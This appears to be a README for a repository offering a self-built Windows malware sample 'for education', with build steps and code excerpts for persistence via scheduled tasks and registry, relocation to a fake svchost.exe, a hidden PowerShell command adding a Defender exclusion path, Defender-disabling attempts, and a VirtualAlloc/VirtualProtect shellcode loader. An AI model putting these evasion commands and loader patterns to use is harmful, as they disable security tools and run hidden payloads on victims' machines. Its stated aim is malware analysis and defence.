# 🔍 Windows Stealth Malware Analysis Project

This project demonstrates techniques used by stealthy malware for educational and research purposes, including:
- 🔐 Process relocation and persistence mechanisms
- 🛡️ Security evasion techniques
- 📁 Registry and filesystem manipulation
- 🧠 In-memory shellcode execution
- 🚫 Anti-debugging techniques

---

## ⚠️ IMPORTANT: Educational Purpose Only

This code is provided **STRICTLY FOR EDUCATIONAL PURPOSES** to demonstrate malware techniques for analysis and research. Running this code on systems without proper isolation may cause:
- Disabling of security features
- Unauthorized system changes
- Potential execution of embedded shellcode
- System compromise

**Always analyze in a secure, isolated environment such as a virtual machine with no network access.**

---

## ⚙️ Features Demonstrated

This sample demonstrates various malware techniques:

- **Process Persistence**
  - Registry autorun entries
  - Scheduled task creation
  - Startup folder shortcuts
  - VBS script launchers for silent execution

- **Defense Evasion**
  - Windows Defender disabling attempts
  - AV exclusion path configuration
  - Admin privilege escalation
  - Hidden execution techniques

- **Stealth Techniques**
  - Self-relocation to system directories
  - Anti-debugging checks
  - Silent error handling
  - Hidden process execution

- **Payload Execution**
  - AES encrypted shellcode
  - Memory allocation for code execution
  - Dynamic memory protection changes
  - Direct thread execution

---

## 🔧 Technical Analysis Setup

### Prerequisites

- Windows 10/11 VM (isolated from network)
- Visual Studio 2022 with .NET support
- DNSPY or other .NET decompiler
- Process Monitor and Process Explorer
- Wireshark (for network analysis)

### Step 1: Create an Isolated Analysis Environment

```powershell
# Enable Hyper-V if not already enabled
Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All

# Create a new VM with no network access for safe analysis
New-VM -Name "MalwareAnalysisVM" -MemoryStartupBytes 4GB -Generation 2
```

### Step 2: Set Up Project for Analysis

Clone this repository and open in Visual Studio:

```bash
git clone https://github.com/yourusername/malware-analysis-project.git
cd malware-analysis-project
```

Review the key components:
- `Program.cs` - Main malware logic
- `app.manifest` - Requests admin privileges
- `MyMalwareApp.csproj` - Project configuration

### Step 3: Build with Required Admin Rights

The project uses an application manifest to request elevated privileges:

```xml
<!-- app.manifest -->
<requestedExecutionLevel level="requireAdministrator" uiAccess="false" />
```

Build the project:

```bash
dotnet publish -c Release -r win-x64 --self-contained true \
  -o analysis-build \
  /p:PublishSingleFile=true \
  /p:IncludeNativeLibrariesForSelfExtract=true
```

---

## 📊 Analysis Techniques

### Static Analysis

1. **Code Review**
   - Identify API calls related to memory manipulation
   - Locate system persistence mechanisms
   - Find encrypted content and decryption routines

2. **Resource Examination**
   - Check for embedded payloads in resources
   - Review application manifest for privilege requests
  
3. **String Analysis**
   - Search for registry keys
   - Identify filesystem paths
   - Look for command execution patterns

### Dynamic Analysis

1. **Process Monitoring**
   - Use Process Monitor to track filesystem/registry changes
   - Monitor child process creation
   - Watch for memory allocation patterns

2. **Debugging Techniques**
   - Bypass anti-debugging checks
   - Set breakpoints at key functions
   - Inspect memory at shellcode execution

3. **Network Analysis**
   - Monitor for connection attempts
   - Identify command and control patterns
   - Capture post-exploitation traffic

---

## 🧠 Code Breakdown

### Process Relocation Logic

```csharp
// Checks if this is initial run or relocated instance
if (isPayloadInstance || currentFilePath.Equals(destPath, StringComparison.OrdinalIgnoreCase))
{
    // Execute payload
}
else
{
    // Handle relocation to %AppData%\Microsoft\Windows\svchost.exe
}
```

### Persistence Mechanisms

```csharp
// Uses multiple persistence methods
bool scheduled = TryCreateScheduledTask(destPath);
if (!scheduled)
{
    // Fallback to registry persistence
    SetRegistryPersistence(destPath);
}
```

### AV Evasion Techniques

```csharp
// Attempts to disable Windows Defender
TryDisableDefender();

// Creates exclusion paths
ProcessStartInfo psi2 = new ProcessStartInfo
{
    FileName = "powershell.exe",
    Arguments = $"-WindowStyle Hidden -Command Add-MpPreference -ExclusionPath '{folderPath}' -Force"
    // ...
};
```

### Shellcode Execution

```csharp
// Memory allocation and execution
IntPtr baseAddress = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_READWRITE);
// Copy shellcode
Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);
// Change protection and execute
VirtualProtect(baseAddress, (UIntPtr)shellcode.Length, PAGE_EXECUTE_READWRITE, out oldProtect);
```

---

## 📚 Further Reading

- [OWASP Secure Coding Practices](https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Microsoft Security Response Center](https://www.microsoft.com/en-us/msrc)
- [Malware Analysis Techniques](https://github.com/rshipp/awesome-malware-analysis)

---

## 🛡️ Responsible Use

This project is provided solely for defensive security research, education and awareness. Understanding how malware operates is essential for developing stronger defenses and detection mechanisms.

Never use these techniques for unauthorized system access or malicious purposes.
